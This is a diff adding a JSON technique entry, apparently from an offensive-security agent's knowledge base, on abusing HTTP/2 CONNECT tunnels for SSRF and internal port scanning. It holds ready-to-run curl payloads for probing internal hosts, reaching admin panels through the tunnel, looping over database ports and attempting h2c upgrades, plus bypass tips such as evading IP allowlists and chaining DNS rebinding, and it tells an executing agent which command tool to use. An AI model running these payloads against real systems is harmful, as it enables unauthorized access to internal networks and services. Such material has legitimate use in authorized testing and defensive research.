@@ -1,0 +1,62 @@
+{
+  "id": "ssrf-http2-connect-tunneling",
+  "title": "HTTP/2 CONNECT Tunneling for SSRF and Port Scanning",
+  "category": "ssrf",
+  "tags": ["ssrf", "http2", "h2", "connect-tunnel", "port-scan", "h2c", "internal-network"],
+  "applicability": {
+    "technologies": ["node", "python", "java", "go", "ruby"],
+    "contexts": ["api-endpoint", "proxy-endpoint", "websocket-endpoint"],
+    "preconditions": ["http2-support", "connect-method-allowed"]
+  },
+  "technique": {
+    "summary": "Abuse HTTP/2 CONNECT method to establish tunnels to internal services for port scanning and accessing internal network resources. H2 CONNECT creates a bidirectional byte stream that can tunnel arbitrary protocols including HTTP/1.1, enabling access to services that are otherwise unreachable from the external network. Use execute_command with curl --http2 as the execution path (not http_request).",
+    "steps": [
+      "Confirm HTTP/2 support on target: check ALPN negotiation, h2 in Alt-Svc header, or response protocol",
+      "Send HTTP/2 CONNECT request to internal host:port — observe :status pseudo-header",
+      ":status 200 indicates port is open and tunnel established; 503/502 indicates closed or filtered",
+      "Port scan internal hosts: iterate through common ports (80, 443, 8080, 8443, 3306, 5432, 6379, 27017)",
+      "Once tunnel established to open port, push raw HTTP/1.1 requests through the tunnel",
+      "Access internal APIs, admin panels, or databases through the established tunnel",
+      "Use H2 multiplexing for concurrent port scans (multiple CONNECT streams simultaneously)"
+    ],
+    "payloads": [
+      {
+        "payload": "curl --http2 -X CONNECT --proxy https://target.com internal-host:80",
+        "encoding": "raw",
+        "context": "proxy-endpoint",
+        "notes": "H2 CONNECT probe — :status 200 = open, 503 = closed. Execute via execute_command, not http_request"
+      },
+      {
+        "payload": "curl --http2 --proxy https://target.com -H 'Host: internal-host' http://internal-host:8080/admin",
+        "encoding": "raw",
+        "context": "proxy-endpoint",
+        "notes": "Push HTTP/1.1 request through established H2 CONNECT tunnel to internal admin panel"
+      },
+      {
+        "payload": "for port in 80 443 8080 8443 3306 5432 6379; do curl -s -o /dev/null -w '%{http_code}' --http2 -X CONNECT --proxy https://target.com internal:$port; echo \":$port\"; done",
+        "encoding": "raw",
+        "context": "proxy-endpoint",
+        "notes": "Port scan loop via H2 CONNECT — execute via execute_command"
+      },
+      {
+        "payload": "curl --http1.1 -H 'Upgrade: h2c' -H 'Connection: Upgrade, HTTP2-Settings' -H 'HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA' https://target.com/",
+        "encoding": "raw",
+        "context": "api-endpoint",
+        "notes": "h2c upgrade attempt — cleartext HTTP/2 via Upgrade header when direct H2 is not available"
+      }
+    ],
+    "bypassTechniques": [
+      "h2c upgrade via Upgrade: h2c header when target doesn't advertise HTTP/2 but backend supports it",
+      "Use hostname instead of IP address for internal targets to bypass IP-based allowlists",
+      "WebSocket upgrade as alternative tunnel: Upgrade: websocket can establish similar bidirectional streams",
+      "H2 multiplexing for concurrent scans: open multiple CONNECT streams in single connection for speed",
+      "Try CONNECT to localhost/127.0.0.1 first to confirm CONNECT is processed before scanning internal range",
+      "Chain with DNS rebinding: resolve attacker domain to internal IP after initial connection"
+    ]
+  },
+  "references": [
+    "https://blog.flomb.net/posts/http2connect/",
+    "https://portswigger.net/research/top-10-web-hacking-techniques-of-2025"
+  ],
+  "source": "portswigger-top10-2025"
+}
